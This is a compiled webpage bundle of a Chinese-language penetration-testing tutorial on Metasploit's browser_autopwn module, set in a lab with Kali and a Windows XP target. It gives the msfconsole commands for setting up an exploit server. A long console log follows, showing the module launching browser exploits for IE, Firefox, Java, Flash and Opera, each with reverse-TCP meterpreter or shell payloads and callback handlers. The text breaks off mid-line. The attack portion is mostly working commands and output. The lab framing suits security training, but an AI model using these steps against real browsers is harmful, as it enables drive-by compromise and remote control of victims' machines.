(window.webpackJsonp=window.webpackJsonp||[]).push([[197],{488:function(t,s,a){"use strict";a.r(s);var n=a(7),e=Object(n.a)({},(function(){var t=this,s=t._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("h1",{attrs:{id:"浏览器渗透"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#浏览器渗透"}},[t._v("#")]),t._v(" 浏览器渗透")]),t._v(" "),s("p",[t._v("攻击机： Kali 192.168.175.128")]),t._v(" "),s("p",[t._v("靶机： WinXP 192.168.175.130")]),t._v(" "),s("h2",{attrs:{id:"browser-autopwn攻击"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#browser-autopwn攻击"}},[t._v("#")]),t._v(" Browser autopwn攻击")]),t._v(" "),s("p",[t._v("Metasploit中提供了一个browser autopwn模块，这是一个可以用来对各种浏览器进行测试和渗透的自动化向量。")]),t._v(" "),s("p",[t._v("autopwn指的是自动对目标进行渗透。autopwn模块在配置了所有要使用的浏览器渗透脚本后，将处于监听模式下。然后，它便等待着一个即将到来的连接。一旦连接建立，它就会发送一系列与目标浏览器相匹配的渗透模块，具体发送哪个模块要取决于受害者浏览器的类型。无论目标系统上运行着什么浏览器，只要存在漏洞，autopwn模块就能自动发起攻击。")]),t._v(" "),s("p",[t._v("Browser autopwn原理图：")]),t._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190124193431777.png",loading:"lazy"}})]),t._v(" "),s("h2",{attrs:{id:"使用metasploit的browser-autopwn模块进行浏览器攻击"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#使用metasploit的browser-autopwn模块进行浏览器攻击"}},[t._v("#")]),t._v(" 使用Metasploit的Browser autopwn模块进行浏览器攻击")]),t._v(" "),s("p",[t._v("这里，我们先打开msf终端")]),t._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[t._v("msfconsole\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br")])]),s("p",[t._v("然后在msf终端依次输入如下命令：")]),t._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[t._v("use auxiliary/server/browser_autopwn\nshow options\n"),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("set")]),t._v(" LHOST "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".175.128\n"),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("set")]),t._v(" URIPATH /\n"),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("set")]),t._v(" SRVPORT "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("80")]),t._v("\nexploit\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br"),s("span",{staticClass:"line-number"},[t._v("4")]),s("br"),s("span",{staticClass:"line-number"},[t._v("5")]),s("br"),s("span",{staticClass:"line-number"},[t._v("6")]),s("br")])]),s("p",[t._v("其中，我们需要制定LHOST、URIPATH、SRVPORT参数。SRVPORT参数制定了渗透服务器使用的端口。这个端口建议为80或者443。URIPATH是存储各种渗透模块的目录路径，它的值被指定为/，表示根目录。设定好这些参数之后，就可以输入命令exploit进行攻击了。")]),t._v(" "),s("p",[t._v("具体如下：")]),t._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[t._v("msf5 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" use auxiliary/server/browser_autopwn\nmsf5 auxiliary"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("server/browser_autopwn"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" show options\n\nModule options "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("auxiliary/server/browser_autopwn"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(":\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   LHOST                     "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("yes")]),t._v("       The IP address to use "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" reverse-connect payloads\n   SRVHOST  "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0.0")]),t._v(".0.0          "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("yes")]),t._v("       The "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("local")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("host")]),t._v(" to listen on. This must be an address on the "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("local")]),t._v(" machine or "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0.0")]),t._v(".0.0\n   SRVPORT  "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8080")]),t._v("             "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("yes")]),t._v("       The "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("local")]),t._v(" port to listen on.\n   SSL      "),s("span",{pre:!0,attrs:{class:"token boolean"}},[t._v("false")]),t._v("            no        Negotiate SSL "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" incoming connections\n   SSLCert                   no        Path to a custom SSL certificate "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("default is randomly generated"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n   URIPATH                   no        The URI to use "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" this exploit "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("default is random"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n\n\nAuxiliary action:\n\n   Name       Description\n   ----       -----------\n   WebServer  Start a bunch of modules and direct clients to appropriate exploits\n\n\nmsf5 auxiliary"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("server/browser_autopwn"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("set")]),t._v(" LHOST "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".175.128\nLHOST "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".175.128\nmsf5 auxiliary"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("server/browser_autopwn"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("set")]),t._v(" URIPATH /\nURIPATH "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" /\nmsf5 auxiliary"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("server/browser_autopwn"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("set")]),t._v(" SRVPORT "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("80")]),t._v("\nSRVPORT "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("80")]),t._v("\nmsf5 auxiliary"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("server/browser_autopwn"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" exploit\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Auxiliary module running as background job "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),t._v(".\n\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Setup\nmsf5 auxiliary"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("server/browser_autopwn"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" \n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting exploit modules on "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("host")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".175.128"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("..")]),t._v(".\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" ---\n\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting exploit android/browser/webview_addjavascriptinterface with payload android/meterpreter/reverse_tcp\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Using URL: http://0.0.0.0:80/Kwhc\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Local IP: http://192.168.175.128:80/Kwhc\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Server started.\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting exploit multi/browser/firefox_proto_crmfrequest with payload generic/shell_reverse_tcp\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Using URL: http://0.0.0.0:80/vzkqpBnTX\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Local IP: http://192.168.175.128:80/vzkqpBnTX\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Server started.\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting exploit multi/browser/firefox_tostring_console_injection with payload generic/shell_reverse_tcp\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Using URL: http://0.0.0.0:80/JLQaHqdG\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Local IP: http://192.168.175.128:80/JLQaHqdG\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Server started.\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting exploit multi/browser/firefox_webidl_injection with payload generic/shell_reverse_tcp\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting exploit multi/browser/java_atomicreferencearray with payload java/meterpreter/reverse_tcp\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Using URL: http://0.0.0.0:80/NObgkNaafM\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Local IP: http://192.168.175.128:80/NObgkNaafM\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Server started.\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting exploit multi/browser/java_jre17_jmxbean with payload java/meterpreter/reverse_tcp\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Using URL: http://0.0.0.0:80/oAXSrii\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Local IP: http://192.168.175.128:80/oAXSrii\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Server started.\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting exploit multi/browser/java_jre17_provider_skeleton with payload java/meterpreter/reverse_tcp\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Using URL: http://0.0.0.0:80/rgkOUbVZ\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Local IP: http://192.168.175.128:80/rgkOUbVZ\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Server started.\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting exploit multi/browser/java_jre17_reflection_types with payload java/meterpreter/reverse_tcp\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Using URL: http://0.0.0.0:80/zOAZWwwA\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Local IP: http://192.168.175.128:80/zOAZWwwA\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Server started.\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting exploit multi/browser/java_rhino with payload java/meterpreter/reverse_tcp\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Using URL: http://0.0.0.0:80/KMZSsvbLbdEAo\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Local IP: http://192.168.175.128:80/KMZSsvbLbdEAo\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Server started.\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting exploit multi/browser/java_verifier_field_access with payload java/meterpreter/reverse_tcp\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Using URL: http://0.0.0.0:80/zHZYuGKZAKbZ\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Local IP: http://192.168.175.128:80/zHZYuGKZAKbZ\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Server started.\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting exploit multi/browser/opera_configoverwrite with payload generic/shell_reverse_tcp\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Using URL: http://0.0.0.0:80/WZzpMp\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Local IP: http://192.168.175.128:80/WZzpMp\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Server started.\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting exploit windows/browser/adobe_flash_mp4_cprt with payload windows/meterpreter/reverse_tcp\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Using URL: http://0.0.0.0:80/lZvfdntlB\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Local IP: http://192.168.175.128:80/lZvfdntlB\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Server started.\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting exploit windows/browser/adobe_flash_rtmp with payload windows/meterpreter/reverse_tcp\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Using URL: http://0.0.0.0:80/pgqDFJQG\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Local IP: http://192.168.175.128:80/pgqDFJQG\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Server started.\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting exploit windows/browser/ie_cgenericelement_uaf with payload windows/meterpreter/reverse_tcp\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Using URL: http://0.0.0.0:80/MERLTwZVxeoDI\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Local IP: http://192.168.175.128:80/MERLTwZVxeoDI\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Server started.\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting exploit windows/browser/ie_createobject with payload windows/meterpreter/reverse_tcp\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Using URL: http://0.0.0.0:80/TpOcHC\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Local IP: http://192.168.175.128:80/TpOcHC\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Server started.\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting exploit windows/browser/ie_execcommand_uaf with payload windows/meterpreter/reverse_tcp\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Using URL: http://0.0.0.0:80/XaoAp\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Local IP: http://192.168.175.128:80/XaoAp\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Server started.\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting exploit windows/browser/mozilla_nstreerange with payload windows/meterpreter/reverse_tcp\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Using URL: http://0.0.0.0:80/GAxmRqM\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Local IP: http://192.168.175.128:80/GAxmRqM\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Server started.\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting exploit windows/browser/ms13_080_cdisplaypointer with payload windows/meterpreter/reverse_tcp\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Using URL: http://0.0.0.0:80/dWTagnZBC\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Local IP: http://192.168.175.128:80/dWTagnZBC\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Server started.\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting exploit windows/browser/ms13_090_cardspacesigninhelper with payload windows/meterpreter/reverse_tcp\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Using URL: http://0.0.0.0:80/nfeHDD\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Local IP: http://192.168.175.128:80/nfeHDD\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Server started.\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting exploit windows/browser/msxml_get_definition_code_exec with payload windows/meterpreter/reverse_tcp\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting handler "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" windows/meterpreter/reverse_tcp on port "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("3333")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting handler "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" generic/shell_reverse_tcp on port "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("6666")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Started reverse TCP handler on "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".175.128:3333 \n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Using URL: http://0.0.0.0:80/NiTvaxR\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Local IP: http://192.168.175.128:80/NiTvaxR\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Server started.\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Using URL: http://0.0.0.0:80/dIoa\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Local IP: http://192.168.175.128:80/dIoa\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Server started.\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting handler "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" java/meterpreter/reverse_tcp on port "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("7777")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Started reverse TCP handler on "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".175.128:6666 \n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Started reverse TCP handler on 